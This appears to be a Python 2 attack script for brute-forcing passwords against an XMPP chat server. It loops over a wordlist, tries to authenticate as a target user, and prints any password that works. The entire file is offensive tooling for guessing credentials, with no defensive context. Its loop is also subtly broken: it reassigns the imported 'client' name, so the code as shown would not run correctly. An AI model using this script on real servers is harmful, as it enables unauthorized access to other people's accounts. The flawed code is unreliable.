from time import sleep
from xmpp import *
from sys import exit

W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange

def xmppBruteforce(address, port, username, wordlist, delay):
    xmppUser = username + "@" + str(address)
    wordlist = open(wordlist, 'r')
    for i in wordlist.readlines():
        password = i.strip("\n")
        try:
            jid = protocol.JID(xmppUser)
            client = client(jid.getDomain(), debug = [])
            client.connect(str(address), port)
            if client.auth(jid.getNode(), password):
                client.sendInitPresence()
                print G + "[*] Username: %s | [*] Password found: %s\n" % (username, password) + W
                client.disconnect()
                exit()
        except:
            print O + "[*] Username: %s | [*] Password: %s | Incorrect!\n" % (username, password) + W
            sleep(delay)
